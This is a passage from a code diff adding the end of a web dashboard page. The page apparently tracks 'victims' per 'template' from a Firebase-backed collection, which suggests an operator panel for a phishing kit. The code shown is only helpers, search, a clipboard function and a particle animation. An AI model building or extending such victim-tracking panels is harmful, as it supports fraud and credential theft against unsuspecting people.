+            const top = templates[0];
+
+            totalTemplatesEl.textContent = templates.length;
+            totalVictimsEl.textContent = totalVictims;
+            todayVictimsEl.textContent = today;
+            topTemplateEl.textContent = top ? top.name : '—';
+            topTemplateEl.title = top ? `${top.name} · ${top.count} victims` : '';
+        }
+
+        // ================================================================
+        //  9.  HELPERS
+        // ================================================================
+        function escHtml(str) {
+            if (str == null) return '—';
+            const div = document.createElement('div');
+            div.textContent = String(str);
+            return div.innerHTML;
+        }
+
+        function toDate(value) {
+            if (!value) return null;
+            if (typeof value.toDate === 'function') return value.toDate();
+            const d = new Date(value);
+            return isNaN(d.getTime()) ? null : d;
+        }
+
+        function isToday(date) {
+            const now = new Date();
+            return date.getFullYear() === now.getFullYear() &&
+                date.getMonth() === now.getMonth() &&
+                date.getDate() === now.getDate();
+        }
+
+        function timeAgo(date) {
+            const diff = Date.now() - date.getTime();
+            const mins = Math.floor(diff / 60000);
+            if (mins < 1) return 'just now';
+            if (mins < 60) return mins + 'm ago';
+            const hours = Math.floor(mins / 60);
+            if (hours < 24) return hours + 'h ago';
+            const days = Math.floor(hours / 24);
+            if (days < 30) return days + 'd ago';
+            return date.toLocaleDateString();
+        }
+
+        async function copyText(text) {
+            try {
+                if (navigator.clipboard && window.isSecureContext) {
+                    await navigator.clipboard.writeText(text);
+                } else {
+                    const ta = document.createElement('textarea');
+                    ta.value = text;
+                    ta.style.position = 'fixed';
+                    ta.style.opacity = '0';
+                    document.body.appendChild(ta);
+                    ta.select();
+                    document.execCommand('copy');
+                    ta.remove();
+                }
+                showToast(`“${text}” copied to clipboard.`, 'success', 'Copied');
+            } catch (err) {
+                showToast('Could not copy to clipboard.', 'error');
+            }
+        }
+
+        // ================================================================
+        //  10. SEARCH
+        // ================================================================
+        let searchTimer = null;
+        searchInput.addEventListener('input', () => {
+            clearTimeout(searchTimer);
+            searchTimer = setTimeout(renderTemplates, 150);
+        });
+
+        // ================================================================
+        //  11. PARTICLE SYSTEM (shared implementation in js/particles.js)
+        // ================================================================
+        Particles.init('particleCanvas', {
+            maxParticles: 80,
+            minParticles: 22,
+            areaPerParticle: 21000,
+            sizeMin: 0.5,
+            sizeMax: 2.5,
+            speed: 0.22,
+            opacityMin: 0.07,
+            opacityMax: 0.4,
+            glow: true,
+            glowColor: 'rgba(0,230,118,0.03)'
+        });
+
+        // ================================================================
+        //  12. INIT
+        // ================================================================
+        console.log('🚀 Templates · derived from victims collection');
+        console.log('🔐 Auth: Firebase Authentication active');
+    </script>
+
+</body>
+
+</html>
